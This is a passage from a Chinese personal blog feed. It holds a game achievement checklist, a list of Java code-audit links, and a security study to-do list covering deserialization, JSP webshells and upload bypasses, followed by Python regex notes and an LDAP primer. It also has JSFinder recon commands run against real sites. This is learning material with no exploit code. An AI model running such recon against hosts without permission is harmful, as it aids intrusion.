class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PURITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;MINIMALIST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COMMON_SENSE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHRUG_IT_OFF&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SPEED_CLIMBER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ONE_RELIC&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;NEON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;INFINITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;FOCUSED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;JAXXED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TRANSIENT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DONUT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CATALYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;NINJA&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="存档加密算法分析"><a href="#存档加密算法分析" class="headerlink" title="存档加密算法分析"></a>存档加密算法分析</h3><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h2 id="全成就快速完成攻略："><a href="#全成就快速完成攻略：" class="headerlink" title="全成就快速完成攻略："></a>全成就快速完成攻略：</h2><h3 id="Boss击杀"><a href="#Boss击杀" class="headerlink" title="Boss击杀"></a><strong>Boss击杀</strong></h3><p>守护者、亡魂、老大、第一勇士、收藏家、机械人偶、乌鸦、形状、时间吞噬者。</p>
<p>这些有手就行，多打几把基本都能完成。</p>
<h3 id="通关"><a href="#通关" class="headerlink" title="通关"></a>通关</h3><p>红宝石：</p>
<p>红宝石+：</p>
<p>绿宝石：</p>
<p>绿宝石+：</p>
<p>蓝宝石：</p>
<p>蓝宝石+：</p>
<p>结局：</p>
<p>紫水晶：</p>
<p>紫水晶+：</p>
<p>进阶0：</p>
<p>进阶10：</p>
<p>进阶20：</p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>瘟疫：</p>
<p>耸肩无视：</p>
<p>契约：</p>
<p>肾上腺素：</p>
<p>纯净：</p>
<p>催化剂：</p>
<p>岿然不动：</p>
<p>岿然不动：</p>
<p>嗑药：</p>
<p>来打我啊：</p>
<p>强大：</p>
<p>无限：</p>
<p>忍者：</p>
<p>弱者为何要战斗：</p>
<p>哦！甜甜圈：</p>
<p>快速攀爬者：</p>
<p>极简主义者：</p>
<p>谁会需要遗物：</p>
<p>平常心：</p>
<p>集中：</p>
<p>霓虹：</p>
<p>今天是个好日子：</p>
<p>倏忽即逝：</p>
<p>永存者：</p>
]]></content>
      <tags>
        <tag>steam</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2023/04/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p><a href="https://www.freebuf.com/articles/web/330861.html">Java代码审计从零到一|基础篇 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.freebuf.com/articles/web/194836.html">Java Web安全之代码审计 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/liguangyao213/article/details/127364763">Java代码审计审技巧及方法_java代码审计入门篇pdf_mingzhi61的博客-CSDN博客</a></p>
<h2 id="铭飞MCMS-5-2-4"><a href="#铭飞MCMS-5-2-4" class="headerlink" title="铭飞MCMS(5.2.4)"></a>铭飞MCMS(5.2.4)</h2><p><a href="https://juejin.cn/post/7104087873976008734#heading-7">Java代码审计之路一（OFCMS） - 掘金 (juejin.cn)</a></p>
<h2 id="OFCMS"><a href="#OFCMS" class="headerlink" title="OFCMS"></a>OFCMS</h2><p><a href="https://forum.butian.net/share/1229">奇安信攻防社区-记又一次Java代码审计 (butian.net)</a></p>
<h2 id="自己高中CMS（水平上来了在审"><a href="#自己高中CMS（水平上来了在审" class="headerlink" title="自己高中CMS（水平上来了在审"></a>自己高中CMS（水平上来了在审</h2><p>代码：<a href="https://github.com/realikun404/tjsj_cms">realikun404&#x2F;tjsj_cms (github.com)</a></p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>todo</title>
    <url>/2023/05/24/todo/</url>
    <content><![CDATA[<p>[toc]</p>
<p><a href="https://www.bilibili.com/video/BV1Sv4y1i7jf/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">B站最全的Java安全学习路线_哔哩哔哩_bilibili</a></p>
<p>Java安全{<br>    IDEA （finish）<br>    Maven <a href="https://www.bilibili.com/video/BV1Ah411S7ZE/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">黑马程序员Maven全套教程，maven项目管理从基础到高级，Java项目开发必会管理工具maven_哔哩哔哩_bilibili</a>	，<a href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>，<a href="https://zhuanlan.zhihu.com/p/37701743">java注解-最通俗易懂的讲解 - 知乎 (zhihu.com)</a></p>
<p>Java Web</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尚硅谷p21</span><br><span class="line"></span><br><span class="line">黑马https://www.bilibili.com/video/BV1m84y1w7Tb</span><br><span class="line">p79</span><br></pre></td></tr></table></figure>

<p>​	反射<br>​	ASM&#x2F;Javassist<br>​	JNDI：8u191低版本和高版本怎么打(反序列化&#x2F;本地工厂)，以及如何审计<br>​	RMI是什么<br>​	Java Agent：启动原理和RASP的实现原理<br>​	JMX&#x2F;JDWP<br>​	反序列化基础：gadget链、JEP290是什么<br>​	FastJson反序列化<br>​	WebLogic：二次反序列化、XML Decoder、IIOP&#x2F;T3<br>​	Xstream反序列化<br>​	Hessian反序列化：dubbo<br>​	SnakeYAML反序列化<br>​	Shiro：Shiro经典漏洞、Padding Oracle漏洞形成原理、如何通过Shiro注入内存马<br>​	Struts2<br>​	Spring：Spring4Shell、Spring EL、SpringBoot Actuator利用<br>​	Tomcat：Tomcat AJP RCE<br>​	内存马原理：原理是什么、有哪些内存马<br>​	内存马如何查杀<br>​	Log4J<br>​	其他组件漏洞：Apache Solr、Flink<br>​	进阶：tabby、codeql等静态分析<br>}</p>
<p><del>真多</del></p>
<h2 id="TODO："><a href="#TODO：" class="headerlink" title="TODO："></a>TODO：</h2><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">status</th>
</tr>
</thead>
<tbody><tr>
<td align="center">了解jsp shell</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">正则表达式</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">P神java安全漫谈学习</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">jsfinder 使用</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">jsfinder代码理解</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">sqlmap源码学习</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">DIVA study</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">学习免杀与查杀</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">了解fastjson漏洞原理</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解cors的危害</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解正则表达式</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解shiro漏洞</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Ldap注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">leetcode top100</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">log4j漏洞分析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mysql学习</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="了解fastjson反序列化漏洞原理："><a href="#了解fastjson反序列化漏洞原理：" class="headerlink" title="了解fastjson反序列化漏洞原理："></a>了解fastjson反序列化漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjson 教程：https://www.bilibili.com/video/BV1Hy4y1x7ri/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d1cb46e12f3981bbb347ae0eb3b44edd</span><br><span class="line"></span><br><span class="line">靶场复现：https://blog.csdn.net/Bossfrank/article/details/130100893</span><br><span class="line"></span><br><span class="line">漏洞原理：https://www.freebuf.com/vuls/361576.html</span><br></pre></td></tr></table></figure>

<h3 id="Cors漏洞原理："><a href="#Cors漏洞原理：" class="headerlink" title="Cors漏洞原理："></a>Cors漏洞原理：</h3><h3 id="JSP-shell"><a href="#JSP-shell" class="headerlink" title="JSP shell"></a>JSP shell</h3><p><a href="https://www.runoob.com/jsp/jsp-tutorial.html">JSP 教程 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://xz.aliyun.com/t/7798">都0202年了老嗨还在用的 - 各种姿势jsp webshell - 先知社区 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/s452195377/article/details/93388422">tomcat下jsp shell（webshell）_shell.jsp_夜行侠~@的博客-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1667652">【实战篇】记一次文件上传漏洞绕过 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://www.cnblogs.com/blacksunny/p/8001201.html">文件上传漏洞（绕过姿势） - blacksunny - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/straycats/p/14461357.html">https://www.cnblogs.com/straycats/p/14461357.html</a></p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p><a href="https://blog.csdn.net/pagean/article/details/106032082">一篇认真的正则入门文章：正则表达式数字和数字范围匹配表达_正则表达式匹配数字范围_曼巴的脚步的博客-CSDN博客</a></p>
<p><a href="https://www.runoob.com/python/python-reg-expressions.html">Python 正则表达式 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://www.sojson.com/regex/generate">正则表达式生成器，常用正则表达式在线生成 (sojson.com)</a></p>
<p><a href="https://www.mklab.cn/utils/regex">Regex正则表达式在线测试生成工具 - MKLab在线工具</a></p>
<p><a href="https://www.cnblogs.com/admans/p/11955614.html#:~:text=%E4%BB%8E%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95%E7%9A%84%E8%A7%92%E5%BA%A6%E6%9D%A5%E8%AE%B2%EF%BC%8C%E8%A2%AB%E5%8C%B9%E9%85%8D%E4%BC%98%E5%85%88%E9%87%8F%E8%AF%8D%E4%BF%AE%E9%A5%B0%E7%9A%84%E5%AD%90%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B0%B1%E6%98%AF%E8%B4%AA%E5%A9%AA%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%A6%82%E2%80%9C,(Expression">正则表达式之 贪婪与非贪婪模式详解（概述） - JackieZhengChina - 博客园 (cnblogs.com)</a>%2B”；被忽略优先量词修饰的子表达式使用的就是非贪婪模式，如“ (Expression)%2B%3F”。)</p>
<p><a href="https://blog.csdn.net/jly164260234/article/details/83215924">Python—re.findall的用法_扫地di的博客-CSDN博客</a></p>
<p>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。</p>
<p>re 模块使 Python 语言拥有全部的正则表达式功能。</p>
<p>compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。re 模块也提供了与这些方法功能完全一致的函数，这些函数使用一个模式字符串做为它们的第一个参数。</p>
<h4 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h4><p>re.match 尝试从字符串的<strong>起始位置</strong>匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</p>
<p>语法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">re.match(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">pattern</td>
<td align="center">匹配的正则表达式</td>
</tr>
<tr>
<td align="center">string</td>
<td align="center">要匹配的字符串。</td>
</tr>
<tr>
<td align="center">flags</td>
<td align="center">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。参见：<a href="https://www.runoob.com/python/python-reg-expressions.html#flags">正则表达式修饰符 - 可选标志</a></td>
</tr>
</tbody></table>
<p>re的修饰符：</p>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.I</td>
<td align="center">使匹配对大小写不敏感</td>
</tr>
<tr>
<td align="center">re.L</td>
<td align="center">做本地化识别（locale-aware）匹配</td>
</tr>
<tr>
<td align="center">re.M</td>
<td align="center">多行匹配，影响 ^ 和 $</td>
</tr>
<tr>
<td align="center">re.S</td>
<td align="center">使 . 匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td align="center">re.U</td>
<td align="center">根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td>
</tr>
<tr>
<td align="center">re.X</td>
<td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td>
</tr>
</tbody></table>
<p>下面讲个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">line = <span class="string">&quot;Cats are smarter than dogs&quot;</span></span><br><span class="line"> </span><br><span class="line">matchObj = re.<span class="keyword">match</span>( <span class="string">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group(1) : &quot;</span>, matchObj.group(<span class="number">1</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;matchObj.group(2) : &quot;</span>, matchObj.group(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">matchObj.group() :  Cats are smarter than dogs</span><br><span class="line">matchObj.group(1) :  Cats</span><br><span class="line">matchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>

<p>对应结果为：</p>
<table>
<thead>
<tr>
<th align="center">匹配对象方法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">group(num&#x3D;0)</td>
<td align="center">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
</tr>
<tr>
<td align="center">groups()</td>
<td align="center">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
</tr>
</tbody></table>
<p>因为match比较菜，就不多说了。</p>
<h4 id="re-search方法"><a href="#re-search方法" class="headerlink" title="re.search方法"></a>re.search方法</h4><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>

<p>函数参数说明：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pattern</td>
<td align="left">匹配的正则表达式</td>
</tr>
<tr>
<td align="left">string</td>
<td align="left">要匹配的字符串。</td>
</tr>
<tr>
<td align="left">flags</td>
<td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>
</tr>
</tbody></table>
<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p>
<p>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p>
<table>
<thead>
<tr>
<th align="left">匹配对象方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">group(num&#x3D;0)</td>
<td align="left">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>
</tr>
<tr>
<td align="left">groups()</td>
<td align="left">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>
</tr>
</tbody></table>
<h4 id="re-match与re-search的区别"><a href="#re-match与re-search的区别" class="headerlink" title="re.match与re.search的区别"></a>re.match与re.search的区别</h4><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>
<h4 id="检索和替换"><a href="#检索和替换" class="headerlink" title="检索和替换"></a>检索和替换</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.sub(pattern, repl, string, count=<span class="number">0</span>, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>pattern : 正则中的模式字符串。</li>
<li>repl : 替换的字符串，也可为一个函数。</li>
<li>string : 要被查找替换的原始字符串。</li>
<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">phone = <span class="string">&quot;2004-959-559 # 这是一个国外电话号码&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除字符串中的 Python注释 </span></span><br><span class="line">num = re.sub(<span class="string">r&#x27;#.*$&#x27;</span>, <span class="string">&quot;&quot;</span>, phone)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;电话号码是: &quot;</span>, num</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 删除非数字(-)的字符串 </span></span><br><span class="line">num = re.sub(<span class="string">r&#x27;\D&#x27;</span>, <span class="string">&quot;&quot;</span>, phone)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;电话号码是 : &quot;</span>, num</span><br><span class="line"><span class="comment">#电话号码是:  2004-959-559 </span></span><br><span class="line"><span class="comment">#电话号码是 :  2004959559</span></span><br></pre></td></tr></table></figure>

<p>repl 参数是一个函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将匹配的数字乘以 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double</span>(<span class="params">matched</span>):</span><br><span class="line">    value = <span class="built_in">int</span>(matched.group(<span class="string">&#x27;value&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(value * <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">s = <span class="string">&#x27;A23G4HFD567&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.sub(<span class="string">&#x27;(?P&lt;value&gt;\d+)&#x27;</span>, double, s))</span><br></pre></td></tr></table></figure>

<p>不管了，直接实战</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;1.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">columns = df.columns.values.tolist()  <span class="comment">### 获取excel 表头 ，第一行</span></span><br><span class="line"><span class="comment"># res=[]</span></span><br><span class="line">myfile = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">patter1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line">patter2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d-25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)-(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, row <span class="keyword">in</span> df.iterrows():  <span class="comment">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class="line">    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">        curstr = row[column]</span><br><span class="line">        <span class="keyword">if</span> pd.isna(curstr):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strlen = <span class="built_in">len</span>(curstr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res1 = re.findall(patter1, <span class="built_in">str</span>(curstr))</span><br><span class="line">        res2 = re.findall(patter2, <span class="built_in">str</span>(curstr))</span><br><span class="line">        <span class="keyword">if</span> res1:</span><br><span class="line">            <span class="built_in">print</span>(res1)</span><br><span class="line">        <span class="keyword">if</span> res2:</span><br><span class="line">            <span class="built_in">print</span>(res2)</span><br></pre></td></tr></table></figure>

<p>可以提取IP形如：192.168.1.1，192.168.1.1-192.168.1.100</p>
<h3 id="java安全学习"><a href="#java安全学习" class="headerlink" title="java安全学习"></a>java安全学习</h3><h3 id="jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）"><a href="#jsFinder-AND-Plus-敏感信息泄露发现神器（内网IP、password等）" class="headerlink" title="jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）"></a>jsFinder AND Plus : 敏感信息泄露发现神器（内网IP、password等）</h3><p><a href="https://blog.csdn.net/qq_41901122/article/details/125151522">(40条消息) JS信息收集工具JSFinder_星球守护者的博客-CSDN博客</a></p>
<p><a href="https://xz.aliyun.com/t/5390">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>
<h4 id="Plus"><a href="#Plus" class="headerlink" title="Plus:"></a>Plus:</h4><p>查看帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3  JSFinderPlus.py -h</span><br></pre></td></tr></table></figure>

<p>简单爬取的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinderPlus.py -u http://202.204.48.66/</span><br></pre></td></tr></table></figure>

<p>深度爬取:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinderPlus.py -u http://202.204.48.66/ -d</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230324223636869.png" alt="image-20230324223636869"></p>
<h4 id="jsFinder"><a href="#jsFinder" class="headerlink" title="jsFinder:"></a>jsFinder:</h4><p><a href="https://xz.aliyun.com/t/5390">JSFinder—从js文件中寻找敏感接口和子域名 - 先知社区 (aliyun.com)</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.jd.com/</span><br></pre></td></tr></table></figure>

<p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.jd.com/ -d -ou jd_url.txt -os jd_domain.txt</span><br></pre></td></tr></table></figure>

<p>除了这两种方式以外，还可以批量指定URL和JS链接来获取里面的URL。</p>
<p>指定URL：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python JSFinder.py -f text.txt</span><br></pre></td></tr></table></figure>

<p>指定JS：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python JSFinder.py -f text.txt -j</span><br></pre></td></tr></table></figure>

<h3 id="Ldap注入"><a href="#Ldap注入" class="headerlink" title="Ldap注入"></a>Ldap注入</h3><p><a href="https://www.freebuf.com/articles/170322.html">PentesterLab 新手教程（三） ：LDAP攻击 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.freebuf.com/vuls/356049.html">Web漏洞那些事儿：LDAP注入 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://xz.aliyun.com/t/5689">从一次漏洞挖掘入门Ldap注入 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_45116657/article/details/103943595">LDAP注入入门学习指南_weixin_45116657的博客-CSDN博客</a></p>
<h4 id="Ldap是什么？"><a href="#Ldap是什么？" class="headerlink" title="Ldap是什么？"></a>Ldap是什么？</h4><p><strong>轻型目录访问协议</strong>（英文：Lightweight Directory Access Protocol，缩写：LDAP）。LDAP是一种通讯协议，LDAP支持TCP&#x2F;IP，默认的端口是 389，加密的端口是 636。简单点来说就是，LDAP就是一个数据库，它是用来存储数据的。</p>
<p>但是，LDAP和其他的数据库（如MySQL、SQLserver）是不一样的，MySQL这类数据库的数据是按记录一条条记录存在表中，而LDAP数据库的结构是<strong>树状</strong>的，似于“<strong>目录服务</strong>”的特殊数据库，数据是存储在叶子节点上的。</p>
<p>为什么要用LDAP目录树来存储数据？用MySQL不行吗，为什么非要搞出一个树形的数据库呢？这是因为用树形结构存储数据，查询效率更高（具体为什么，可以看一下关系型数据库索引的实现原理——B树&#x2F;B+树）。在某些特定的场景下，使用树形数据库更理想。比如：需要储存大量的数据，而且数据不是经常更改，需要很快速的查找。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDAP（轻量级目录访问协议，Lightweight Directory Access Protocol）和MySQL是两种截然不同的技术。LDAP是一个目录服务协议，用于在网络中存储和查询有关对象（如用户、组、设备）的信息。MySQL是一种关系型数据库管理系统，用于存储、查询和管理结构化数据。</span><br><span class="line"></span><br><span class="line">以下是LDAP和MySQL之间的主要差异：</span><br><span class="line"></span><br><span class="line">数据结构：</span><br><span class="line">LDAP：LDAP数据以树状结构（称为目录信息树，DIT）存储，每个节点（称为条目）包含一组属性及其值。LDAP主要用于存储和查询具有层次结构的数据。</span><br><span class="line">MySQL：MySQL中的数据以表格形式存储，每个表格包含多个行和列。关系型数据库主要用于存储和查询结构化数据。</span><br><span class="line"></span><br><span class="line">查询语言：</span><br><span class="line">LDAP：使用LDAP查询语言（如LDAP搜索过滤器）进行数据查询。</span><br><span class="line">MySQL：使用结构化查询语言（SQL）进行数据查询和管理。</span><br><span class="line"></span><br><span class="line">用途：</span><br><span class="line">LDAP：通常用于身份验证和授权、组织结构和设备管理等场景。例如，LDAP常用于企业网络环境中的单点登录（SSO）和访问控制。</span><br><span class="line">MySQL：适用于存储和查询大量结构化数据的场景，如网站后端数据库、应用程序数据存储等。</span><br><span class="line"></span><br><span class="line">性能和可扩展性：</span><br><span class="line">LDAP：LDAP是为读取操作优化的协议，因此读取性能很高。但是，对于写入操作，LDAP的性能相对较低。LDAP支持复制和分区，可以通过这些特性提高可扩展性。</span><br><span class="line">MySQL：关系型数据库通常在读取和写入性能方面都表现良好。通过分片、复制和分区等技术，MySQL可以实现高可扩展性。</span><br><span class="line">学习曲线：</span><br><span class="line"></span><br><span class="line">LDAP：学习LDAP可能需要更多时间，因为它涉及到目录服务概念、树状结构和查询语法。</span><br><span class="line">MySQL：相对来说，学习MySQL和SQL语言更容易上手。</span><br><span class="line">总之，LDAP和MySQL分别针对不同的应用场景和数据存储需求。LDAP适用于存储和查询具有层次结构的数据，而MySQL适用于存储和查询结构化数据。根据实际需求选择合适的技术是关键。</span><br></pre></td></tr></table></figure>

